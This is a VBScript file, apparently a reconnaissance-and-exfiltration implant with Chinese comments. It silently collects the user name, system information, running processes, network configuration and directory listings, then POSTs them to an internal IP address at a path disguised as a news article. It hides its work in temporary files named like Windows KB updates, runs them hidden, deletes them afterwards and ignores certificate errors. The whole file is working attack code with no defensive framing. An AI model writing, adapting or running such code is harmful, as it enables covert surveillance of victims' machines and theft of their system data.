'RunWithCscript()
Dim Ret,NW
Set NW=WScript.CreateObject("WScript.NetWork")
Ret = Ret & vbCrLf & "LocalTime:" & Now & vbCrLf & "LoginUser:" & NW.UserName
Ret = Ret & vbCrLf & RunCmd("systeminfo")
Ret = Ret & vbCrLf & RunCmd("tasklist")
Ret = Ret & vbCrLf & RunCmd("ipconfig /all")
Ret = Ret & vbCrLf & RunCmd("dir c:\users\")
Ret = Ret & vbCrLf & RunCmd("dir c:\""Documents and Settings""\")
Ret = Ret & vbCrLf & RunCmd("dir ""C:\Program Files (x86)""")
Ret = Ret & vbCrLf & RunCmd("dir ""C:\Program Files""")

WScript.Echo HttpPost("http://192.168.0.129/News/Article.php",NW.ComputerName&"="&ret)

'--------------------------------------------------------------------------------
'只能在cscript中使用，在wscript中会弹黑框,CmdStr中绝不可以加 cmd /c 后果自负
Function ExeCmd(CmdStr)
	On Error Resume Next
	Dim WS
	Set WS = WScript.CreateObject("Wscript.Shell")
	Set CMD=WS.Exec("%comspec%")
	cmd.StdIn.WriteLine CmdStr
	cmd.StdIn.Close
	'If Not cmd.StdErr.AtEndOfStream Then cmdERR=cmd.StdErr.ReadAll
	If cmdERR <> "" Then 
		ExeCmd=cmdERR
	Else
		For i=0 To 3 
			cmd.StdOut.SkipLine
		Next
		Do Until cmd.StdOut.AtEndOfStream
			tmp=tmp&vbCrLf&cmd.StdOut.ReadLine
			If Not cmd.StdOut.AtEndOfStream Then ExeCmd=tmp
		Loop
	End If
	Set CMD=Nothing
	Set WS=Nothing
End Function


'------------------------------------------------------------------------------
Function RunCmd(CmdStr)
	Dim fso,WS,CmdFile,CmdFileStr,Ret,EchoFileStr,EchoStr,EchoFile
	Set fso = WScript.CreateObject("Scripting.Filesystemobject")
	Set WS = WScript.CreateObject("Wscript.Shell")
	CmdFileStr=WS.SpecialFolders("MyDocuments") & "\KB23121927.bat"
	EchoFileStr=WS.SpecialFolders("MyDocuments") & "\KB68521911.dat"
	Set CmdFile=fso.OpenTextFile(CmdFileStr,2,True)
	CmdFile.WriteLine CmdStr & " >> " & EchoFileStr
	CmdFile.Close
	Ret=WS.Run("cmd /c" & CmdFileStr,0,True)
	If Ret=0 Then
		Set EchoFile=fso.OpenTextFile(EchoFileStr,1,True)
		Do Until EchoFile.AtEndOfStream
			EchoStr=EchoFile.ReadAll
		Loop 
		EchoFile.Close
		fso.DeleteFile EchoFileStr,True
		fso.DeleteFile CmdFileStr,True
	Else
		EchoStr=fso.OpenTextFile(CmdFileStr,1,True).ReadAll & vbCrLf & "执行失败!"
		fso.DeleteFile CmdFileStr,True
	End If
	Set fso=Nothing
	Set WS=Nothing
	RunCmd=EchoStr
End Function 





Function GB2312ToUnicode(str)
	With CreateObject("adodb.stream")
		.Type = 1 : .Open
		.Write str : .Position = 0
		.Type = 2 : .Charset = "gb2312"
		GB2312ToUnicode = .ReadText : .Close
	End With
End Function








'---------------------------------------------------------------------------------------
'
Function HttpGet(url)
	Dim http
	Set http=CreateObject("Msxml2.ServerXMLHTTP")
	http.setOption 2,13056	'忽略https错误
	http.open "GET",url,False
	http.send
	http.waitForResponse 30
	HttpGet = GB2312ToUnicode(http.responseBody)
End Function 


Function HttpPost(url,data)
	Dim http
	Set http=CreateObject("Msxml2.ServerXMLHTTP")
	http.setOption 2,13056	'忽略https错误
	http.open "POST",url,False
	http.setRequestHeader "Content-Type","application/x-www-form-urlencoded"
	http.send data
	http.waitForResponse 30
	HttpPost = GB2312ToUnicode(http.responseBody)
End Function 


'------------------------------------------------------------------------
'强制用cscript运行
'------------------------------------------------------------------------
Sub RunWithCscript()
	If (LCase(Right(WScript.FullName,11))="wscript.exe") Then 
		Set objShell=WScript.CreateObject("wscript.shell")
		If WScript.Arguments.Count=0 Then 
			objShell.Run("cmd.exe /k cscript //nologo "&chr(34)&WScript.ScriptFullName&chr(34))
		Else
			Dim argTmp
			For Each arg In WScript.Arguments
				argTmp=argTmp&arg&" "
			Next 
			objShell.Run("cmd.exe /k cscript //nologo "&chr(34)&WScript.ScriptFullName&chr(34)&" "&argTmp)
		End If
		WScript.Quit
	End If
End Sub


